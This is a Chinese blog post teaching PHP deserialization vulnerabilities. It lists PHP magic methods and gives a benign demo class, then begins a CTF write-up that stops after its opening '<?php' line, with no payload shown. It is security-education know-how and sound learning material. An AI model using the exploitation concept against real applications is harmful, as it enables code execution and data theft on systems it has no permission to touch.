<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>php 反序列化 | 林之介 | 4rozeN</title><meta name="author" content="4rozeN"><meta name="copyright" content="4rozeN"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="理解漏洞产生原理，理解几个常见的反序列化场景。"><meta property="og:type" content="article"><meta property="og:title" content="php 反序列化"><meta property="og:url" content="https://4rozen.github.io/posts/91123"><meta property="og:site_name" content="林之介 | 4rozeN"><meta property="og:description" content="理解漏洞产生原理，理解几个常见的反序列化场景。"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://ali-4rozen-oss.oss-cn-guangzhou.aliyuncs.com/blog/cover/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.webp"><meta property="article:published_time" content="2022-10-09T02:50:13.000Z"><meta property="article:modified_time" content="2025-07-22T06:48:22.043Z"><meta property="article:author" content="4rozeN"><meta property="article:tag" content="反序列化"><meta property="article:tag" content="PHP"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://ali-4rozen-oss.oss-cn-guangzhou.aliyuncs.com/blog/cover/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.webp"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"php 反序列化","url":"https://4rozen.github.io/posts/91123","image":"https://ali-4rozen-oss.oss-cn-guangzhou.aliyuncs.com/blog/cover/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.webp","datePublished":"2022-10-09T02:50:13.000Z","dateModified":"2025-07-22T06:48:22.043Z","author":[{"@type":"Person","name":"4rozeN","url":"https://4rozen.github.io/"}]}</script><link rel="icon shortcut" href="/img/ico/favicon.ico"><link rel="canonical" href="https://4rozen.github.io/posts/91123"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><meta name="google-site-verification" content="ggjgSh07y0_dbMruvoZhis-cgZn-t6ujdG7N1z7ZA88"><meta name="msvalidate.01" content="F0E34077A7291AC38724F6A3804B1B29"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.7.2/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media=&quot;all&quot;"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media=&quot;all&quot;"><script>(()=>{const e={set:(e,t,o)=>{if(!o)return;const n=Date.now()+864e5*o;localStorage.setItem(e,JSON.stringify({value:t,expiry:n}))},get:e=>{const t=localStorage.getItem(e);if(!t)return;const{value:o,expiry:n}=JSON.parse(t);if(!(Date.now()>n))return o;localStorage.removeItem(e)}};window.btf={saveToLocal:e,getScript:(e,t={})=>new Promise((o,n)=>{const a=document.createElement("script");a.src=e,a.async=!0,Object.entries(t).forEach(([e,t])=>a.setAttribute(e,t)),a.onload=a.onreadystatechange=()=>{a.readyState&&!/loaded|complete/.test(a.readyState)||o()},a.onerror=n,document.head.appendChild(a)}),getCSS:(e,t)=>new Promise((o,n)=>{const a=document.createElement("link");a.rel="stylesheet",a.href=e,t&&(a.id=t),a.onload=a.onreadystatechange=()=>{a.readyState&&!/loaded|complete/.test(a.readyState)||o()},a.onerror=n,document.head.appendChild(a)}),addGlobalFn:(e,t,o=!1,n=window)=>{const a=n.globalFn||{};a[e]=a[e]||{},a[e][o||Object.keys(a[e]).length]=t,n.globalFn=a}};const t=()=>{document.documentElement.setAttribute("data-theme","dark"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#0d0d0d")},o=()=>{document.documentElement.setAttribute("data-theme","light"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#ffffff")};btf.activateDarkMode=t,btf.activateLightMode=o;const n=e.get("theme"),a=(new Date).getHours();void 0===n?a<=6||a>=18?t():o():"light"===n?o():t();const r=e.get("aside-status");void 0!==r&&document.documentElement.classList.toggle("hide-aside","hide"===r);/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)&&document.documentElement.classList.add("apple")})();</script><script>const GLOBAL_CONFIG={root:"/",algolia:void 0,localSearch:{path:"/search.xml",preload:!1,top_n_per_article:1,unescape:!1,languages:{hits_empty:"未找到符合您查询的内容：${query}",hits_stats:"共找到 ${hits} 篇文章"}},translate:{defaultEncoding:2,translateDelay:0,msgToTraditionalChinese:"繁",msgToSimplifiedChinese:"简"},highlight:void 0,copy:{success:"复制成功",error:"复制失败",noSupport:"浏览器不支持"},relativeDate:{homepage:!1,post:!1},runtime:"天",dateSuffix:{just:"刚刚",min:"分钟前",hour:"小时前",day:"天前",month:"个月前"},copyright:{limitCount:100,languages:{author:"作者: 4rozeN",link:"链接: ",source:"来源: 林之介 | 4rozeN",info:"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},lightbox:"fancybox",Snackbar:{chs_to_cht:"已切换为繁体中文",cht_to_chs:"已切换为简体中文",day_to_night:"已切换为深色模式",night_to_day:"已切换为浅色模式",bgLight:"#49b1f5",bgDark:"#1f1f1f",position:"bottom-left"},infinitegrid:{js:"https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js",buttonText:"加载更多"},isPhotoFigcaption:!1,islazyloadPlugin:!0,isAnchor:!0,percent:{toc:!0,rightside:!1},autoDarkmode:!1};</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"php 反序列化",isHighlightShrink:!1,isToc:!0,pageType:"post"};</script><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@300..700&family=Noto+Sans+SC:wght@100..900&family=Noto+Serif+SC:wght@200..900&display=swap" rel="stylesheet"><link rel="stylesheet" href="/css/figure.css"><link rel="stylesheet" href="/css/butterfly.css"><link rel="stylesheet" href="/css/ripple-toggle.css"><link rel="stylesheet" href="/css/rightmenu.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-shiki-plugin@latest/lib/codeblock.css"><style>:root{--hl-color:#abb2bf;--hl-bg:#282c34;--hltools-bg:#21252b;--hltools-color:#bbbbbc;--hlnumber-bg:#282c34;--hlnumber-color:#495162;--hlscrollbar-bg:#373c47;--hlexpand-bg:linear-gradient(180deg,rgba(40,44,52,.1),rgba(40,44,52,.9))}</style><style>.code-expand-btn:not(.expand-done)~* div.codeblock,.code-expand-btn:not(.expand-done)~div.codeblock{height:360px;overflow:hidden}</style><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/rss2.xml" title="林之介 | 4rozeN" type="application/rss+xml"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src= "/img/loading/loading.gif" data-lazy-src="/img/avatar/avatar.jpg" onerror="this.onerror=null,this.src=&quot;/img/avatar/emo.webp&quot;" alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">45</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><div class="menus_items"><div class="menus_item"><span class="group site-page"><i class="fa-book fa-fw fas"></i><span> 文章</span><i class="fa-chevron-down fas"></i></span><ul class="menus_item_child"><li><a class="child site-page" href="/archives/"><i class="fa-archive fa-fw fas"></i><span> 全部文章</span></a></li><li><a class="child site-page" href="/categories/"><i class="fa-folder-open fa-fw fas"></i><span> 分类列表</span></a></li><li><a class="child site-page" href="/tags/"><i class="fa-fw fa-tags fas"></i><span> 标签列表</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa-link fas"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa-user fas"></i><span> 个人</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="fixed post-bg" id="page-header" style="background-image:url(https://ali-4rozen-oss.oss-cn-guangzhou.aliyuncs.com/blog/cover/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.webp)"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src= "/img/loading/loading.gif" data-lazy-src="/img/nav/mySVG.svg" alt="Logo"></a><a class="nav-page-title" href="/"><span class="site-name">php 反序列化</span></a></span><div id="menus"><div id="search-button"><span class="search site-page social-icon"><i class="fa-fw fa-search fas"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><span class="group site-page"><i class="fa-book fa-fw fas"></i><span> 文章</span><i class="fa-chevron-down fas"></i></span><ul class="menus_item_child"><li><a class="child site-page" href="/archives/"><i class="fa-archive fa-fw fas"></i><span> 全部文章</span></a></li><li><a class="child site-page" href="/categories/"><i class="fa-folder-open fa-fw fas"></i><span> 分类列表</span></a></li><li><a class="child site-page" href="/tags/"><i class="fa-fw fa-tags fas"></i><span> 标签列表</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa-link fas"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa-user fas"></i><span> 个人</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fa-bars fa-fw fas"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">php 反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-calendar-alt fa-fw far post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-09T02:50:13.000Z" title="发表于 2022-10-09 10:50:13">2022-10-09</time><span class="post-meta-separator">|</span><i class="fa-fw fa-history fas post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-22T06:48:22.043Z" title="更新于 2025-07-22 14:48:22">2025-07-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fa-fw fa-inbox fas post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="fa-file-word fa-fw far post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">5.6k</span><span class="post-meta-separator">|</span><i class="fa-clock fa-fw far post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>23分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data='{"limitDay":15,"messagePrev":"文章最后编辑于","messageNext":"天前。","postUpdate":"2025-07-22 14:48:22"}' hidden></div><link rel="external nofollow noreferrer stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"> <h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2> <p>仅作留档。</p> <h2 id="php反序列化"><a class="markdownIt-Anchor" href="#php反序列化"></a> php 反序列化</h2> <p>定义：序列化就是将对象转换成字符串。反序列化相反，数据的格式的转换对象的序列化利于对象的保存和传输，也可以让多个文件共享对象。</p> <p>漏洞原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化的过程，从而导致代码执行，SQL 注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。</p> <figure class="php shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="dark-plus shiki"><code><span class="line"><span style="color:#dcdcaa">serialize</span><span style="color:#d4d4d4">()		</span><span style="color:#6a9955">//将一个对象转换成要给字符串</span></span>
<span class="line"><span style="color:#dcdcaa">unserialize</span><span style="color:#d4d4d4">()	</span><span style="color:#6a9955">//将字符串还原成一个对象	触发： unserialize函数的变量可控，文件中存在可利用的类，类中有魔术方法</span></span>
<span class="line"><span style="color:#dcdcaa">__toString</span><span style="color:#d4d4d4">()	</span><span style="color:#6a9955">//方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时</span></span>
<span class="line"><span style="color:#dcdcaa">__construct</span><span style="color:#d4d4d4">()	</span><span style="color:#6a9955">//创建对象时触发</span></span>
<span class="line"><span style="color:#dcdcaa">__destruct</span><span style="color:#d4d4d4">()	</span><span style="color:#6a9955">//对象被销毁时触发</span></span>
<span class="line"><span style="color:#dcdcaa">__wakeup</span><span style="color:#d4d4d4">()		</span><span style="color:#6a9955">//在使用unserialize()时，会检查是否存在一个__wakeup()魔术方法。如果存在，则该方法会先被调用，预先准备对象需要的资源。</span></span>
<span class="line"><span style="color:#dcdcaa">__call</span><span style="color:#d4d4d4">()		</span><span style="color:#6a9955">//在对象上下文中调用不可访问的方法时触发</span></span>
<span class="line"><span style="color:#dcdcaa">__invoke</span><span style="color:#d4d4d4">()		</span><span style="color:#6a9955">//在脚本尝试将对象调用为函数时触发</span></span>
<span class="line"><span style="color:#dcdcaa">__callStatic</span><span style="color:#d4d4d4">()	</span><span style="color:#6a9955">//在静态上下文中调用不可访问的方法时触发</span></span>
<span class="line"><span style="color:#dcdcaa">__get</span><span style="color:#d4d4d4">()			</span><span style="color:#6a9955">//用于从不可访问的属性读取数据</span></span>
<span class="line"><span style="color:#dcdcaa">__set</span><span style="color:#d4d4d4">()			</span><span style="color:#6a9955">//用于将数据写入不可访问的属性</span></span>
<span class="line"><span style="color:#dcdcaa">__isset</span><span style="color:#d4d4d4">() 		</span><span style="color:#6a9955">//在不可访问的属性上调用isset()或empty()触发</span></span>
<span class="line"><span style="color:#dcdcaa">__unset</span><span style="color:#d4d4d4">()		</span><span style="color:#6a9955">//在不可访问的属性上使用unset()时触发</span></span></code></pre></div></div></figure> <p><img src= "/img/loading/loading.gif" data-lazy-src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507221445041.png" alt="image-20220924112412517"></p> <p><img src= "/img/loading/loading.gif" data-lazy-src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507221446017.png" alt="image-20220928101409891"></p> <h2 id="常用魔术方法"><a class="markdownIt-Anchor" href="#常用魔术方法"></a> 常用魔术方法</h2> <figure class="php shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></div><div class="code"><pre class="dark-plus shiki"><code><span class="line"><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">、__get、__set</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">这两个方法是为在类和他们的父类中没有声明的属性而设计的</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">__get</span><span style="color:#d4d4d4">( </span><span style="color:#9cdcfe">$property</span><span style="color:#d4d4d4"> ) 当调用一个未定义的属性时访问此方法</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">__set</span><span style="color:#d4d4d4">( </span><span style="color:#9cdcfe">$property</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$value</span><span style="color:#d4d4d4"> ) 给一个未定义的属性赋值时调用</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）</span></span>
<span class="line"></span>
<span class="line"><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">、__isset、__unset</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">__isset</span><span style="color:#d4d4d4">( </span><span style="color:#9cdcfe">$property</span><span style="color:#d4d4d4"> ) </span><span style="color:#dcdcaa">当在一个未定义的属性上调用isset</span><span style="color:#d4d4d4">()函数时调用此方法</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">__unset</span><span style="color:#d4d4d4">( </span><span style="color:#9cdcfe">$property</span><span style="color:#d4d4d4"> ) </span><span style="color:#dcdcaa">当在一个未定义的属性上调用unset</span><span style="color:#d4d4d4">()函数时调用此方法</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">与__get方法和__set方法相同，这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）</span></span>
<span class="line"></span>
<span class="line"><span style="color:#b5cea8">3</span><span style="color:#d4d4d4">、__call</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">__call</span><span style="color:#d4d4d4">( </span><span style="color:#9cdcfe">$method</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$arg_array</span><span style="color:#d4d4d4"> ) </span><span style="color:#dcdcaa">当调用一个未定义</span><span style="color:#d4d4d4">(包括没有权限访问)的方法是调用此方法</span></span>
<span class="line"></span>
<span class="line"><span style="color:#b5cea8">4</span><span style="color:#d4d4d4">、__autoload</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">__autoload 函数，使用尚未被定义的类时自动调用。通过此函数，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">注意: 在 __autoload 函数中抛出的异常不能被 </span><span style="color:#c586c0">catch</span><span style="color:#d4d4d4"> 语句块捕获并导致致命错误。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#b5cea8">5</span><span style="color:#d4d4d4">、__construct、__destruct</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">__construct 构造方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">__destruct 析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">默认情况下,PHP仅仅释放对象属性所占用的内存并销毁对象相关的资源</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">，析构函数允许你在使用一个对象之后执行任意代码来清除内存，当PHP决定你的脚本不再与对象相关时，析构函数将被调用</span><span style="color:#d4d4d4">.</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">在一个函数的命名空间内，这会发生在函数return的时候，对于全局变量，这发生于脚本结束的时候，如果你想明确地销毁一个对象，你可以给指向该对象的变量分配任何其它值，通常将变量赋值勤为NULL或者调用unset。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#b5cea8">6</span><span style="color:#d4d4d4">、__clone</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">PHP5中的对象赋值是使用的引用赋值，使用clone方法复制一个对象时，对象会自动调用__clone魔术方法，如果在对象复制需要执行某些初始化操作，可以在__clone方法实现。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#b5cea8">7</span><span style="color:#d4d4d4">、__toString</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">__toString方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时，如果类没有实现此方法，则无法通过echo打印对象，否则会显示：Catchable fatal error: </span><span style="color:#569cd6">Object</span><span style="color:#d4d4d4"> of </span><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">test</span><span style="color:#d4d4d4"> could not be converted to string in，此方法必须返回一个字符串。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">在PHP 5.2.0之前，__toString方法只有结合使用echo() 或 print()时 才能生效。PHP 5.2.0之后，则可以在任何字符串环境生效（例如通过printf()，使用%s修饰符），但 不能用于非字符串环境（如使用%d修饰符）</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">从PHP 5.2.0，如果将一个未定义__toString方法的对象 转换为字符串，会报出一个E_RECOVERABLE_ERROR错误。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">8、__sleep、__wakeup</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">__sleep 串行化的时候用</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">__wakeup 反串行化的时候调用</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">serialize() 检查类中是否有魔术名称 __sleep 的函数。如果这样，该函数将在任何序列化之前运行。它可以清除对象并应该返回一个包含有该对象中应被序列化的所有变量名的数组。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">使用 __sleep 的目的是关闭对象可能具有的任何数据库连接，提交等待中的数据或进行类似的清除任务。此外，如果有非常大的对象而并不需要完全储存下来时此函数也很有用。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">相反地，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">9、__set_state</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">当调用var_export()时，这个静态 方法会被调用（自PHP 5.1.0起有效）。本方法的唯一参数是一个数组，其中包含按array(’property’ =&gt; value, …)格式排列的类属性。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">10、__invoke</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">当尝试以调用函数的方式调用一个对象时，__invoke 方法会被自动调用。PHP5.3.0以上版本有效</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">11、__callStatic</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">它的工作方式类似于 __call() 魔术方法，__callStatic() 是为了处理静态方法调用，PHP5.3.0以上版本有效，PHP 确实加强了对 __callStatic() 方法的定义；它必须是公共的，并且必须被声明为静态的。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">同样，__call() 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此。</span></span></code></pre></div></div></figure> <p>案例</p> <figure class="php shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="dark-plus shiki"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">ABC</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$test</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__construct</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$test</span><span style="color:#d4d4d4"> =</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'调用了构造函数&lt;br&gt;'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__destruct</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'调用了析构函数&lt;br&gt;'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__wakeup</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'调用了苏醒函数&lt;br&gt;'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'创建对象a&lt;br&gt;'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">=</span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">ABC</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'序列化&lt;br&gt;'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#9cdcfe">$a_ser</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">serialize</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'反序列化&lt;br&gt;'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#9cdcfe">$a_unser</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">unserialize</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$a_ser</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'对象快要死了！'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">     </span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure> <p><img src= "/img/loading/loading.gif" data-lazy-src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507221446663.png" alt="image-20221009162607187"></p> <p>要记忆的东西很多，记不住的话建议向上面那样开三个窗口对着看，或者多屏</p> <h3 id="swpuctf-2021-新生赛ez_unserialize"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛ez_unserialize"></a> [SWPUCTF 2021 新生赛] ez_unserialize</h3> <p>普通反序列化</p> <figure class="php shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div><div class="code"><pre class="dark-plus shiki"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
